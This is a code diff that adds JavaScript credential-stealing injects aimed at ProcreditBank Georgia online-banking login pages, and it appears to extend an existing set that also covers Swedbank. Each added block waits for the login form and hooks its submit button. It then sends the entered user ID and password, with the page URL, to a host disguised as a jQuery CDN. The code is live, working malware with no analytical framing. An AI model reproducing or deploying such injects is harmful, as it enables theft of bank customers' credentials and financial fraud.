@@ -7,6 +7,49 @@ for (var i = 0; i < arrayLength; i++) {
   }
 }
 
+if (top['location']['href']['indexOf']('online.procreditbank.ge') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementById']('LoginTable')) {
+            clearInterval(interval);
+            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
+              var login = {};
+                  login.userid = document.getElementsByClassName("Login_input_name")[0].value;
+                  login.password = document.getElementsByClassName("Login_input_pass")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+            }
+        }
+    }, 1000)
+};
+
+if (top['location']['href']['indexOf']('online2.procreditbank.ge') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementById']('LoginTable')) {
+            clearInterval(interval);
+            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
+              var login = {};
+                  login.userid = document.getElementsByClassName("Login_input_name")[0].value;
+                  login.password = document.getElementsByClassName("Login_input_pass")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+            }
+        }
+    }, 1000)
+};
+
+
+if (top['location']['href']['indexOf']('online1.procreditbank.ge') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementById']('LoginTable')) {
+            clearInterval(interval);
+            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
+              var login = {};
+                  login.userid = document.getElementsByClassName("Login_input_name")[0].value;
+                  login.password = document.getElementsByClassName("Login_input_pass")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+            }
+        }
+    }, 1000)
+};
+
 
 if (top['location']['href']['indexOf']('internetbank.swedbank.se') > -1) {
     var interval = setInterval(function () {
